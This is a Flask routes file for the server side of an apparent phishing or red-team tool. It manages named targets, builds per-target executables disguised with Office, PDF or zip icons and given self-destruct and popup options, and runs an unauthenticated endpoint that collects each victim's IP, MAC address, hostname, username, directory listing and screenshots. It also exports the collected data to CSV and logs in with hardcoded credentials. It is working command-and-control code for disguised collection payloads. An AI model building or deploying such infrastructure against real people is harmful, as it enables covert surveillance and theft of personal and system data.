import os
import json
from functools import wraps
from datetime import datetime
from flask import (
    Blueprint, render_template, request, redirect, url_for, flash,
    send_file, jsonify, current_app, session
)

from .models import (
    init_db, add_target, add_targets_batch, get_all_targets,
    get_target_by_id, get_target_by_token, add_collection,
    get_collections_by_target, get_all_collections, get_stats,
    delete_collection, delete_collections_batch,
)

UPLOADS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'uploads')


def _remove_screenshot(filename):
    if not filename:
        return
    path = os.path.join(UPLOADS_DIR, filename)
    if os.path.exists(path):
        try:
            os.remove(path)
        except OSError:
            pass

# ---- Management Web UI Blueprint ----
routes_web = Blueprint('routes_web', __name__)

# Default credentials
DEFAULT_USERNAME = 'fish'
DEFAULT_PASSWORD = 'fishfish@123'


def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('routes_web.login'))
        return f(*args, **kwargs)
    return decorated


# ---- Login ----

@routes_web.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        if username == DEFAULT_USERNAME and password == DEFAULT_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('routes_web.index'))
        error = '账号或密码错误'
    return render_template('login.html', error=error)


@routes_web.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('routes_web.login'))


# ---- Dashboard ----

@routes_web.route('/')
@login_required
def index():
    stats = get_stats()
    collections = get_all_collections()
    return render_template('index.html', stats=stats, collections=collections)


# ---- Target Management ----

def _exe_filename(target_name, token, exe_filename=''):
    from .config_manager import BIN_EXT, resolve_exe_name
    return resolve_exe_name(target_name, token, exe_filename) + BIN_EXT


def _exe_exists(target_name, token):
    from .exe_builder import is_exe_registered
    return is_exe_registered(token)


@routes_web.route('/targets')
@login_required
def targets():
    all_targets = get_all_targets()
    for t in all_targets:
        t['exe_exists'] = _exe_exists(t['name'], t['unique_token'])
    server_configured = _check_server_configured()
    return render_template('targets.html', targets=all_targets, server_configured=server_configured)


@routes_web.route('/targets/add', methods=['GET', 'POST'])
@login_required
def add_target_view():
    if request.method == 'POST':
        name = request.form.get('name', '').strip()
        email = request.form.get('email', '').strip()
        department = request.form.get('department', '').strip()
        exe_filename = request.form.get('exe_filename', '').strip()

        if not name:
            flash('名称为必填项', 'error')
            return redirect(url_for('routes_web.add_target_view'))

        target_id, token = add_target(name, email, department, exe_filename)
        flash(f'目标已添加 (Token: {token[:8]}...)', 'success')
        return redirect(url_for('routes_web.targets'))

    return render_template('add_target.html')


def _is_target_header(parts):
    if not parts:
        return False
    return parts[0].strip().lower() in ('姓名', '名称', '目标姓名', 'name', 'target')


def _target_entry_from_parts(parts):
    parts = [(str(p).strip() if p is not None else '') for p in parts]
    if not parts or not parts[0] or _is_target_header(parts):
        return None
    name = parts[0]
    email = parts[1] if len(parts) > 1 else ''
    dept = parts[2] if len(parts) > 2 else ''
    exe_filename = parts[3] if len(parts) > 3 else ''
    return (name, email, dept, exe_filename)


def _parse_targets_text(text):
    import csv
    import io as io_mod
    entries = []
    reader = csv.reader(io_mod.StringIO(text))
    for parts in reader:
        entry = _target_entry_from_parts(parts)
        if entry:
            entries.append(entry)
    return entries


def _decode_csv_upload(file_storage):
    raw = file_storage.read()
    for encoding in ('utf-8-sig', 'utf-8', 'gb18030', 'gbk', 'cp936'):
        try:
            return raw.decode(encoding)
        except UnicodeDecodeError:
            continue
    return raw.decode('utf-8', errors='replace')


def _parse_targets_csv(file_storage):
    import csv
    import io as io_mod
    data = _decode_csv_upload(file_storage)
    entries = []
    reader = csv.reader(io_mod.StringIO(data))
    for parts in reader:
        entry = _target_entry_from_parts(parts)
        if entry:
            entries.append(entry)
    return entries


def _parse_targets_xlsx(file_storage):
    from openpyxl import load_workbook
    wb = load_workbook(file_storage, read_only=True, data_only=True)
    ws = wb.active
    entries = []
    for row in ws.iter_rows(values_only=True):
        entry = _target_entry_from_parts(row)
        if entry:
            entries.append(entry)
    wb.close()
    return entries


@routes_web.route('/targets/import_template')
@login_required
def download_import_template():
    import csv
    import io as io_mod
    from flask import Response

    headers = ['姓名', '邮箱', '部门', 'EXE文件名']
    rows = [
        ['张三', 'zhangsan@example.com', '技术部', '张三方案'],
        ['李四', 'lisi@example.com', '财务部', ''],
    ]
    file_type = request.args.get('type', 'xlsx').lower()

    if file_type == 'csv':
        output = io_mod.StringIO()
        writer = csv.writer(output)
        writer.writerow(headers)
        writer.writerows(rows)
        return Response(
            output.getvalue().encode('utf-8-sig'),
            mimetype='text/csv',
            headers={'Content-Disposition': 'attachment; filename=targets_import_template.csv'}
        )

    from openpyxl import Workbook
    output = io_mod.BytesIO()
    wb = Workbook()
    ws = wb.active
    ws.title = 'targets'
    ws.append(headers)
    for row in rows:
        ws.append(row)
    wb.save(output)
    output.seek(0)
    return Response(
        output.getvalue(),
        mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        headers={'Content-Disposition': 'attachment; filename=targets_import_template.xlsx'}
    )


@routes_web.route('/targets/batch', methods=['GET', 'POST'])
@login_required
def batch_add_targets():
    if request.method == 'POST':
        entries = []
        text = request.form.get('batch_data', '').strip()
        if text:
            entries.extend(_parse_targets_text(text))

        upload = request.files.get('target_file')
        if upload and upload.filename:
            filename = upload.filename.lower()
            try:
                if filename.endswith('.csv'):
                    entries.extend(_parse_targets_csv(upload))
                elif filename.endswith('.xlsx'):
                    entries.extend(_parse_targets_xlsx(upload))
                else:
                    flash('仅支持 CSV 或 xlsx 文件导入', 'error')
                    return redirect(url_for('routes_web.batch_add_targets'))
            except Exception as e:
                flash(f'文件解析失败: {e}', 'error')
                return redirect(url_for('routes_web.batch_add_targets'))

        if not entries:
            flash('未能解析任何有效数据，请检查格式 (姓名,邮箱,部门,EXE文件名)', 'error')
            return redirect(url_for('routes_web.batch_add_targets'))

        add_targets_batch(entries)
        flash(f'成功批量添加 {len(entries)} 个目标', 'success')
        return redirect(url_for('routes_web.targets'))

    return render_template('batch_add.html')


@routes_web.route('/targets/<int:target_id>')
@login_required
def target_detail(target_id):
    target = get_target_by_id(target_id)
    if not target:
        flash('目标不存在', 'error')
        return redirect(url_for('routes_web.targets'))
    collections = get_collections_by_target(target_id)
    for c in collections:
        try:
            c['dir_info_parsed'] = json.loads(c['directory_info'])
        except Exception:
            c['dir_info_parsed'] = None
    return render_template('target_detail.html', target=target, collections=collections)


@routes_web.route('/targets/<int:target_id>/delete', methods=['POST'])
@login_required
def delete_target(target_id):
    from .models import get_db
    conn = get_db()
    rows = conn.execute('SELECT screenshot_path FROM collections WHERE target_id = ?', (target_id,)).fetchall()
    screenshots = [r['screenshot_path'] for r in rows if r['screenshot_path']]
    conn.execute('DELETE FROM collections WHERE target_id = ?', (target_id,))
    conn.execute('DELETE FROM targets WHERE id = ?', (target_id,))
    conn.commit()
    conn.close()
    for s in screenshots:
        _remove_screenshot(s)
    flash('目标已删除', 'success')
    return redirect(url_for('routes_web.targets'))


def _check_server_configured():
    """Return True if server_host is configured (not default 127.0.0.1)."""
    from .config_manager import load_config
    config = load_config()
    host = config.get('server_host', '127.0.0.1').strip()
    if host in ('127.0.0.1', 'localhost', '::1', ''):
        return False
    return True


def _require_server_configured():
    """Like _check_server_configured but also flashes a message for redirect routes."""
    if not _check_server_configured():
        flash('请先在 EXE 配置页面设置目标可达的服务器 IP', 'error')
        return False
    return True


@routes_web.route('/targets/<int:target_id>/build_exe', methods=['POST'])
@login_required
def build_exe_from_target(target_id):
    if not _require_server_configured():
        return jsonify({'status': 'error', 'message': '请先在 EXE 配置页面设置服务器 IP'}), 400

    from .exe_builder import build_exe_async

    target = get_target_by_id(target_id)
    if not target:
        return jsonify({'status': 'error', 'message': '目标不存在'}), 404

    listen_url = _get_listen_url()
    build_exe_async(
        listen_url, target['unique_token'], target['name'], target_id,
        target.get('exe_filename', '')
    )
    return jsonify({'status': 'ok', 'message': '开始生成'})


@routes_web.route('/build_status_all')
@login_required
def build_status_all():
    from .exe_builder import get_all_build_status
    return jsonify(get_all_build_status())


@routes_web.route('/targets/<int:target_id>/download_exe')
@login_required
def download_exe_from_target(target_id):
    target = get_target_by_id(target_id)
    if not target:
        flash('目标不存在', 'error')
        return redirect(url_for('routes_web.targets'))

    filename = _exe_filename(target['name'], target['unique_token'], target.get('exe_filename', ''))
    from .exe_builder import OUTPUT_DIR
    filepath = os.path.join(OUTPUT_DIR, filename)
    if not os.path.exists(filepath):
        flash('EXE文件不存在，请先生成', 'error')
        return redirect(url_for('routes_web.targets'))

    return send_file(filepath, as_attachment=True, download_name=filename)


@routes_web.route('/targets/<int:target_id>/delete_exe', methods=['POST'])
@login_required
def delete_exe_from_target(target_id):
    target = get_target_by_id(target_id)
    if not target:
        flash('目标不存在', 'error')
        return redirect(url_for('routes_web.targets'))

    filename = _exe_filename(target['name'], target['unique_token'], target.get('exe_filename', ''))
    from .exe_builder import OUTPUT_DIR, unregister_exe
    filepath = os.path.join(OUTPUT_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
    unregister_exe(target['unique_token'])
    flash('EXE已删除', 'success')

    return redirect(url_for('routes_web.targets'))


@routes_web.route('/targets/delete_all_exe', methods=['POST'])
@login_required
def delete_all_exe():
    from .exe_builder import OUTPUT_DIR, clear_exe_registry, BIN_EXT
    count = 0
    if os.path.exists(OUTPUT_DIR):
        for f in os.listdir(OUTPUT_DIR):
            if f.endswith(BIN_EXT):
                os.remove(os.path.join(OUTPUT_DIR, f))
                count += 1
    clear_exe_registry()
    flash(f'已清除 {count} 个文件', 'success')
    return redirect(url_for('routes_web.targets'))


@routes_web.route('/targets/batch_delete', methods=['POST'])
@login_required
def batch_delete_targets():
    from .models import get_db
    ids = request.form.getlist('ids[]')
    if ids:
        conn = get_db()
        id_list = [int(i) for i in ids]
        placeholders = ','.join('?' for _ in id_list)
        rows = conn.execute(f'SELECT screenshot_path FROM collections WHERE target_id IN ({placeholders})', id_list).fetchall()
        screenshots = [r['screenshot_path'] for r in rows if r['screenshot_path']]
        conn.execute(f'DELETE FROM collections WHERE target_id IN ({placeholders})', id_list)
        conn.execute(f'DELETE FROM targets WHERE id IN ({placeholders})', id_list)
        conn.commit()
        conn.close()
        for s in screenshots:
            _remove_screenshot(s)
        flash(f'已删除 {len(ids)} 个目标', 'success')
    return redirect(url_for('routes_web.targets'))


@routes_web.route('/targets/batch_build_exe', methods=['POST'])
@login_required
def batch_build_exe_targets():
    if not _require_server_configured():
        return jsonify({'status': 'error', 'message': '请先在 EXE 配置页面设置服务器 IP'}), 400

    from .exe_builder import build_exe_async
    ids = request.form.getlist('ids[]')
    listen_url = _get_listen_url()
    count = 0
    for tid in ids:
        target = get_target_by_id(int(tid))
        if target:
            build_exe_async(
                listen_url, target['unique_token'], target['name'], target['id'],
                target.get('exe_filename', '')
            )
            count += 1
    return jsonify({'status': 'ok', 'message': f'已开始生成 {count} 个EXE'})


# ---- EXE Generation ----


def _get_listen_url():
    """Get the listen URL from EXE config for embedding in EXEs."""
    from .config_manager import load_config
    config = load_config()
    host = config.get('server_host', '127.0.0.1')
    port = config.get('server_port', 8080)
    return f'http://{host}:{port}'


@routes_web.route('/exe/build_base', methods=['POST'])
@login_required
def build_base():
    from .exe_builder import build_all_base_exes
    try:
        results = build_all_base_exes()
        flash(f'基础EXE构建成功: {len(results)} 个', 'success')
    except Exception as e:
        flash(f'构建失败: {e}', 'error')
    return redirect(url_for('routes_web.exe_generate'))


@routes_web.route('/exe/generate')
@login_required
def exe_generate():
    from .exe_builder import OUTPUT_DIR, BIN_EXT, BASE_EXE_PATH
    all_targets = get_all_targets()
    files = []
    if os.path.exists(OUTPUT_DIR):
        files = sorted(
            [f for f in os.listdir(OUTPUT_DIR) if f.endswith(BIN_EXT)],
            key=lambda f: os.path.getmtime(os.path.join(OUTPUT_DIR, f)),
            reverse=True
        )
    has_base_exe = os.path.exists(BASE_EXE_PATH)
    server_configured = _check_server_configured()
    return render_template('exe_generate.html', targets=all_targets, files=files,
                           has_base_exe=has_base_exe, server_configured=server_configured)


@routes_web.route('/exe/generate/<int:target_id>', methods=['POST'])
@login_required
def build_single_exe(target_id):
    if not _require_server_configured():
        return redirect(url_for('routes_web.exe_config'))

    from .exe_builder import build_exe

    target = get_target_by_id(target_id)
    if not target:
        flash('目标不存在', 'error')
        return redirect(url_for('routes_web.exe_generate'))

    listen_url = _get_listen_url()

    try:
        exe_path = build_exe(
            listen_url, target['unique_token'], target['name'],
            target.get('exe_filename', '')
        )
        flash(f'EXE生成成功: {os.path.basename(exe_path)}', 'success')
    except Exception as e:
        flash(f'EXE生成失败: {e}', 'error')

    return redirect(url_for('routes_web.exe_generate'))


@routes_web.route('/exe/generate/batch', methods=['POST'])
@login_required
def build_batch_exes():
    if not _require_server_configured():
        return redirect(url_for('routes_web.exe_config'))

    from .exe_builder import build_exes_batch

    target_ids = request.form.getlist('target_ids')
    if not target_ids:
        flash('请选择至少一个目标', 'error')
        return redirect(url_for('routes_web.exe_generate'))

    targets = []
    for tid in target_ids:
        t = get_target_by_id(int(tid))
        if t:
            targets.append({
                'id': t['id'],
                'name': t['name'],
                'token': t['unique_token'],
                'exe_filename': t.get('exe_filename', ''),
            })

    listen_url = _get_listen_url()
    results = build_exes_batch(listen_url, targets)

    success_count = sum(1 for r in results if r['success'])
    fail_count = len(results) - success_count
    flash(f'批量生成完成: 成功 {success_count} 个, 失败 {fail_count} 个', 'success')
    return redirect(url_for('routes_web.exe_generate'))


@routes_web.route('/exe/download/<path:filename>')
@login_required
def download_exe(filename):
    from .exe_builder import OUTPUT_DIR
    filepath = os.path.join(OUTPUT_DIR, filename)
    if not os.path.exists(filepath):
        flash('文件不存在', 'error')
        return redirect(url_for('routes_web.exe_generate'))
    return send_file(filepath, as_attachment=True, download_name=filename)


# ---- Collections ----


@routes_web.route('/collections')
@login_required
def collections():
    all_collections = get_all_collections()
    return render_template('collections.html', collections=all_collections)


@routes_web.route('/collections/<int:col_id>/delete', methods=['POST'])
@login_required
def delete_single_collection(col_id):
    screenshot = delete_collection(col_id)
    _remove_screenshot(screenshot)
    flash('已删除', 'success')
    return redirect(url_for('routes_web.collections'))


@routes_web.route('/collections/batch_delete', methods=['POST'])
@login_required
def batch_delete_collections():
    ids = request.form.getlist('ids[]')
    if ids:
        screenshots = delete_collections_batch([int(i) for i in ids])
        for s in screenshots:
            _remove_screenshot(s)
        flash(f'已删除 {len(ids)} 条记录', 'success')
    return redirect(url_for('routes_web.collections'))


def _csv_cell(value, max_len=30000):
    if value is None:
        return ''
    value = str(value)
    value = value.replace('\r\n', ' ').replace('\r', ' ').replace('\n', ' ').replace('\t', ' ')
    value = ' '.join(value.split())
    if len(value) > max_len:
        return value[:max_len] + f'...（已截断，原始长度 {len(value)}）'
    return value


@routes_web.route('/collections/export')
@login_required
def export_collections():
    import csv
    import io as io_mod
    ids = request.args.getlist('ids[]')
    if ids:
        all_data = get_all_collections()
        id_set = set(int(i) for i in ids)
        rows = [r for r in all_data if r['id'] in id_set]
    else:
        rows = get_all_collections()

    output = io_mod.StringIO()
    writer = csv.writer(output)
    writer.writerow(['ID', '目标姓名', '邮箱', '部门', 'IP/MAC地址', '出口IP',
                      'MAC地址原始数据', '主机名', '用户名', '截屏文件', '目录信息', '回传时间'])
    for r in rows:
        writer.writerow([
            _csv_cell(r['id']), _csv_cell(r.get('target_name', '')),
            _csv_cell(r.get('target_email', '')), _csv_cell(r.get('target_department', '')),
            _csv_cell(r['ip_address']), _csv_cell(r.get('exit_ip', '')),
            _csv_cell(r['mac_address']), _csv_cell(r['hostname']),
            _csv_cell(r['username']), _csv_cell(r['screenshot_path']),
            _csv_cell(r['directory_info']), _csv_cell(r['received_at']),
        ])

    output.seek(0)
    from flask import Response
    return Response(
        output.getvalue().encode('utf-8-sig'),
        mimetype='text/csv',
        headers={'Content-Disposition': 'attachment; filename=collections_export.csv'}
    )


@routes_web.route('/uploads/<path:filename>')
@login_required
def uploaded_file(filename):
    uploads_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'uploads')
    return send_file(os.path.join(uploads_dir, filename))


@routes_web.route('/icons/<path:filename>')
@login_required
def icon_file(filename):
    icons_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'output', 'icons')
    return send_file(os.path.join(icons_dir, filename))


# ---- EXE Config ----


@routes_web.route('/exe/config', methods=['GET', 'POST'])
@login_required
def exe_config():
    from .config_manager import load_config, save_config, save_icon, ICONS_DIR

    if request.method == 'POST':
        # Handle preset icon selection
        preset = request.form.get('select_preset', '')
        if preset:
            preset_path = os.path.join(ICONS_DIR, preset)
            if os.path.exists(preset_path):
                config = load_config()
                config['icon_path'] = preset_path
                save_config(config)
                flash(f'已选择图标: {preset}', 'success')
                return redirect(url_for('routes_web.exe_config'))

        # Handle custom icon upload
        if 'icon_file' in request.files:
            icon_file = request.files['icon_file']
            if icon_file and icon_file.filename:
                if not icon_file.filename.lower().endswith('.ico'):
                    flash('仅支持 .ico 格式的图标文件', 'error')
                else:
                    save_icon(icon_file)
                    flash('图标已更新', 'success')

        # Handle name template config
        save_template = request.form.get('save_template', '')
        if save_template:
            name_template = request.form.get('name_template', '').strip()
            if name_template:
                config = load_config()
                config['name_template'] = name_template
                save_config(config)
                flash('名称模板已保存', 'success')

        # Handle behavior settings (separate form)
        if request.form.get('save_behavior'):
            config = load_config()
            config['self_destruct'] = request.form.get('self_destruct') == 'on'
            config['popup_enabled'] = request.form.get('popup_enabled') == 'on'
            # Only update message if the field was actually submitted (not disabled)
            if 'popup_message' in request.form:
                config['popup_message'] = request.form.get('popup_message', '').strip()
            save_config(config)
            flash('行为设置已保存', 'success')

        # Handle server config (separate form)
        if request.form.get('save_server'):
            config = load_config()
            host = request.form.get('server_host', '').strip()
            port_str = request.form.get('server_port', '8080').strip()
            if host:
                config['server_host'] = host
            if port_str.isdigit():
                config['server_port'] = int(port_str)
            save_config(config)
            flash('服务端配置已保存', 'success')

        return redirect(url_for('routes_web.exe_config'))

    # Generate built-in icons if not exist
    try:
        from .icon_extractor import generate_builtin_icons
        icons_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'output', 'icons')
        builtin = ['xlsx.ico', 'docx.ico', 'zip.ico', 'pdf.ico']
        if not all(os.path.exists(os.path.join(icons_dir, f)) for f in builtin):
            generate_builtin_icons()
    except Exception:
        pass

    # List available preset icons
    presets = []
    icons_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'output', 'icons')
    if os.path.exists(icons_dir):
        for f in os.listdir(icons_dir):
            if f.endswith('.ico'):
                presets.append(f)

    config = load_config()
    preview = config['name_template'].replace('{name}', '张三').replace('{token8}', 'a1b2c3d4').replace('{token}', 'a1b2c3d4-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
    return render_template('exe_config.html', config=config, preview=preview, presets=presets)


# ---- Data Export / Import ----


@routes_web.route('/data')
@login_required
def data_manage():
    return render_template('data_manage.html')


@routes_web.route('/data/export')
@login_required
def export_data():
    import zipfile
    import tempfile
    import shutil
    from datetime import datetime

    base = os.path.dirname(os.path.dirname(__file__))
    data_dir = os.path.join(base, 'data')
    uploads_dir = os.path.join(base, 'uploads')
    icons_dir = os.path.join(base, 'output', 'icons')

    tmpdir = tempfile.mkdtemp()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    zip_path = os.path.join(tmpdir, f'fuzzteam_backup_{timestamp}.zip')

    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            # database
            db_path = os.path.join(data_dir, 'database.db')
            if os.path.exists(db_path):
                zf.write(db_path, 'database.db')
            # configs
            for cfg in ('exe_config.json', 'exe_registry.json'):
                cfg_path = os.path.join(data_dir, cfg)
                if os.path.exists(cfg_path):
                    zf.write(cfg_path, cfg)
            # uploads
            if os.path.exists(uploads_dir):
                for f in os.listdir(uploads_dir):
                    fp = os.path.join(uploads_dir, f)
                    if os.path.isfile(fp):
                        zf.write(fp, f'uploads/{f}')
            # icons
            if os.path.exists(icons_dir):
                for f in os.listdir(icons_dir):
                    if f.endswith('.ico'):
                        zf.write(os.path.join(icons_dir, f), f'icons/{f}')

        return send_file(zip_path, as_attachment=True,
                         download_name=f'fuzzteam_backup_{timestamp}.zip')
    finally:
        # schedule cleanup (best effort after response)
        import threading
        def _clean():
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass
        threading.Thread(target=_clean, daemon=True).start()


@routes_web.route('/data/import', methods=['POST'])
@login_required
def import_data():
    import zipfile
    import tempfile
    import shutil
    from datetime import datetime

    uploaded = request.files.get('backup_file')
    if not uploaded or not uploaded.filename:
        flash('请选择备份文件', 'error')
        return redirect(url_for('routes_web.data_manage'))

    if not uploaded.filename.lower().endswith('.zip'):
        flash('仅支持 .zip 格式', 'error')
        return redirect(url_for('routes_web.data_manage'))

    base = os.path.dirname(os.path.dirname(__file__))
    data_dir = os.path.join(base, 'data')
    uploads_dir = os.path.join(base, 'uploads')
    icons_dir = os.path.join(base, 'output', 'icons')
    backups_dir = os.path.join(base, 'backups')

    tmpdir = tempfile.mkdtemp()
    zip_path = os.path.join(tmpdir, 'import.zip')

    try:
        uploaded.save(zip_path)

        # Validate zip
        with zipfile.ZipFile(zip_path, 'r') as zf:
            names = zf.namelist()
            if 'database.db' not in names:
                flash('备份文件无效：未找到 database.db', 'error')
                return redirect(url_for('routes_web.data_manage'))

        # Auto-backup current data
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        backup_path = os.path.join(backups_dir, f'pre_import_{timestamp}')
        os.makedirs(backup_path, exist_ok=True)
        for f in os.listdir(data_dir):
            fp = os.path.join(data_dir, f)
            if os.path.isfile(fp):
                shutil.copy2(fp, os.path.join(backup_path, f))
        flash(f'当前数据已备份至 backups/pre_import_{timestamp}', 'success')

        # Extract and restore
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(tmpdir)

        # Replace database
        src_db = os.path.join(tmpdir, 'database.db')
        if os.path.exists(src_db):
            shutil.copy2(src_db, os.path.join(data_dir, 'database.db'))

        # Replace configs
        for cfg in ('exe_config.json', 'exe_registry.json'):
            src = os.path.join(tmpdir, cfg)
            if os.path.exists(src):
                shutil.copy2(src, os.path.join(data_dir, cfg))

        # Replace uploads
        src_uploads = os.path.join(tmpdir, 'uploads')
        if os.path.exists(src_uploads):
            if os.path.exists(uploads_dir):
                shutil.rmtree(uploads_dir)
            shutil.copytree(src_uploads, uploads_dir)

        # Replace icons
        src_icons = os.path.join(tmpdir, 'icons')
        if os.path.exists(src_icons):
            os.makedirs(icons_dir, exist_ok=True)
            for f in os.listdir(src_icons):
                shutil.copy2(os.path.join(src_icons, f), os.path.join(icons_dir, f))

        flash('数据导入成功', 'success')
    except Exception as e:
        flash(f'导入失败: {e}', 'error')
    finally:
        try:
            shutil.rmtree(tmpdir)
        except Exception:
            pass

    return redirect(url_for('routes_web.data_manage'))


# ---- API Blueprint (data collection endpoint) ----
routes_api = Blueprint('routes_api', __name__)


@routes_api.route('/api/collect', methods=['POST'])
def api_collect():
    token = request.form.get('token', '')
    if not token:
        return jsonify({'status': 'error', 'message': 'missing token'}), 400

    target = get_target_by_token(token)
    if not target:
        return jsonify({'status': 'error', 'message': 'invalid token'}), 404

    ip_address = request.form.get('ip_address', '')
    mac_address = request.form.get('mac_address', '')
    hostname = request.form.get('hostname', '')
    username = request.form.get('username', '')
    directory_info = request.form.get('directory_info', '{}')

    screenshot_path = ''
    screenshot_file = request.files.get('screenshot')
    if screenshot_file and screenshot_file.filename:
        uploads_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'uploads')
        os.makedirs(uploads_dir, exist_ok=True)

        import secrets
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"screenshot_{target['id']}_{timestamp}_{secrets.token_hex(4)}.jpg"
        filepath = os.path.join(uploads_dir, filename)
        screenshot_file.save(filepath)
        screenshot_path = filename

    exit_ip = request.remote_addr or ''
    add_collection(
        target['id'], ip_address, mac_address, hostname, username,
        screenshot_path, directory_info, exit_ip
    )

    return jsonify({'status': 'ok', 'message': 'data received'}), 200
